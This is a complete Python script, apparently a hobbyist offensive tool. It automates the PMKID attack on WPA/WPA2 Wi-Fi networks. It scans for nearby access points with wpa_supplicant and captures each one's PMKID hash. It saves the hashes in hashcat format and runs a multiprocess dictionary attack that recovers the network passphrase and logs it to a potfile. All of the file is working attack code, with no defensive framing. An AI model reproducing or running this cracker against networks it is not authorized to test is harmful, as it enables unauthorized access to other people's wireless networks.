#!/usr/bin/env python

### By Sinf0r0s0 ###

###  thank's to kcdtv for describing the use of wpa_supplicant here: https://www.wifi-libre.com/topic-1144-revolucion-en-el-crack-wpa-ataque-por-diccionario-contra-pmkid-page-2.html#p11773

import subprocess
import re
import sys
from hashlib import pbkdf2_hmac, sha1
import argparse
import datetime
import multiprocessing


start = datetime.datetime.now()

parser = argparse.ArgumentParser()
parser.add_argument('-i', action='store', dest='interface_to_use', help='wlan interface')
parser.add_argument('-w', action='store', dest='wordlist_file', help='wordlist file')
parser.add_argument('-s', action='store', dest='scan_time', help='AP scaning time (default 5 seconds)')
parser.add_argument('-t', action='store', dest='time_out', help='timeout to retrieve PMKID (default 15 seconds)')
results = parser.parse_args()

interface = results.interface_to_use
wordlist = results.wordlist_file
scan = results.scan_time
timeout = results.time_out

if wordlist is None or interface is None:
    parser.print_help()
    sys.exit()
else:
    try:
        wf = open(wordlist, 'r')
    except IOError:
        print("[!] I cannot load this file: " + wordlist)
        sys.exit()

if scan is None:
    scan = '5'

if timeout is None:
    timeout = '15'    

stop_supp = ('systemctl stop wpa_supplicant.service').split()
start_supp = ('systemctl start wpa_supplicant.service').split()
wlan_mac = ('cat /sys/class/net/' + interface + '/address').split()
commsupp = ('timeout ' + scan + ' wpa_supplicant -c wpa_supp.conf -i ' + interface + ' -dd').split()#  using timeout, just works...
commsupp2 = ('timeout ' + timeout + ' wpa_supplicant -c wpa_supp.conf -i ' + interface + ' -dd').split()

wpa_supp = "wpa_supp.conf"
hashcatfile = 'hashcat16800.hash'  # change here hashcat file name/location
potfile = 'pmkidauto.potfile'  # change here hashcat potfile name/location


def run_command(command):
 
    p = subprocess.Popen(command,
                         stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT)
    return iter(p.stdout.readline, b'')

 
def mac_get():
    for meck in run_command(wlan_mac):
        return meck.strip().replace(":","")


def f_works(f_name, f_data):
    try:
        open(f_name).readline()
        if f_name == hashcatfile or f_name == potfile:
            with open(f_name, "a+") as f:
                if (f_data + "\n") in f.readlines():
                    if f_name == hashcatfile:
                        print("[!] AP: " + ess_id + ", This PMKID hash is alredy on hashcat16800 file\n")
                else:
                    with open(f_name, "a+") as f:
                        f.writelines((f_data + "\n"))
        else:
            with open(f_name, "w") as f:
                f.write(('network={\nssid="%s"\npsk="12345678"\n}' % (f_data)))
    except IOError:
        if f_name == hashcatfile or f_name == potfile:
            with open(f_name,"a+") as f:
                f.writelines((f_data + "\n"))
        else:
            with open(f_name,"w") as f:
                f.write(('network={\nssid=""\npsk="12345678"\n}'))      


def hcl():
    pmkid, macap = (None,)*2

    for line in run_command(commsupp2):
        line = line.strip()

        if 'selected BSS' in line:
            macap = (line.split()[3].replace(":", ""))

        if 'PMKID from' in line:
            pmkid = (line[49:].replace(" ", ""))

            if not macap is None or pmkid is None:
                return [pmkid,macap]


def to_brute(pmkid, msg, essid, sem):

    sem.acquire()

    with open(wordlist) as w:
        for line in w:
            word = line.strip()
            if len(word) <= 7:
                continue

            # pbkdf2_gen
            pmk = (pbkdf2_hmac(hash_name='sha1', password=word, salt=essid, iterations=4096, dklen=32))

            # hmac-sha1_gen end compare
            trans_5C = "".join(chr(x ^ 0x5c) for x in xrange(256))
            trans_36 = "".join(chr(x ^ 0x36) for x in xrange(256))
            blocksize = sha1().block_size
            pmk += chr(0) * (blocksize - len(pmk))
            o_key_pad = pmk.translate(trans_5C)
            i_key_pad = pmk.translate(trans_36)
            # compare hmac-sha1 with PMKID, if match show result end kill child process.
            if (sha1(o_key_pad + sha1(i_key_pad + msg).digest()).hexdigest()[:32]) == pmkid:

                end = datetime.datetime.now()
                elapsed = end - start

                print("\033[1;32;1m[!] AP: %s Cracked!!!\n\t\tPSK...: %s \n\t\tTime elapsed...: %s \n\033[1;37;1m" % (essid, word, str(elapsed)[:-3]))

                to_potfile = ("%s:%s" % (hashcat_line, word))

                f_works(potfile, to_potfile)

                sem.release()

                sys.exit()

        print( "[!] Ap " + essid + " Wordlist Exhausted\n")

        sem.release()

print("[!] pmkidauto Running...\n")

f_works(wpa_supp, "")

run_command(stop_supp)

aps = []
name_mac ={} 

for line in run_command(commsupp):
    line = line.strip()

    if 'Could not read interface' in line:
        print("[!] " + line + "\n" )
        sys.exit()

    elif 'rfkill: WLAN soft blocked' in line:
        print("[!] " + line + "\n" )
        sys.exit()

    if 'BSS: Add new id' in line:
        ap_name = line.split("'")[1]
        ap_mac = line.split("'")[0].split()[7]

        if not ap_mac in aps:
            aps.append(ap_mac)
            name_mac[ap_name] = ap_mac

for ess_id in name_mac:
    print("[!] Found AP: " + ess_id + " trying get hash...\n")

    f_works(wpa_supp, ess_id)
    hash_list=hcl()

    if not hash_list is None:
        if hash_list[0] == "00000000000000000000000000000000":
            print("[!] AP: " + ess_id + " is NOT vulnerable\n")
            continue

        pmk_id = (hash_list[0])
        mac_ap = (hash_list[1])
        mac_cli = mac_get()
        msg = ("504d4b204e616d65" + mac_ap + mac_cli).decode("hex")  # Atom's magic numbers :)

        hashcat_line = ("%s*%s*%s*%s" % (pmk_id, mac_ap, mac_cli, ess_id.encode("hex")))
        f_works(hashcatfile, hashcat_line)

        maxconnections = multiprocessing.cpu_count() #  number of spawning to_bute() function, based on your processor cores
        sem = multiprocessing.BoundedSemaphore(value=maxconnections)

        try:
            if mac_ap in open(potfile).read():
                print("[!] AP: " + ess_id + ", This Password is alredy on potfile :)\n")
            else:
                print("[!] AP " + ess_id + ": hash recovered! :) trying Crack...\n")
                mp = multiprocessing.Process(target=to_brute, args=(pmk_id, msg, ess_id, sem))
                mp.start()
        except IOError:
            print("[!] No potfile found, trying Crack..\n")
            mp = multiprocessing.Process(target=to_brute, args=(pmk_id, msg, ess_id, sem))
            mp.start()

    else:
        print("[!] Timeout, AP: " + ess_id + " is farway or not vulnerable.\n")
        continue

run_command(start_supp)

f_works(wpa_supp, "")
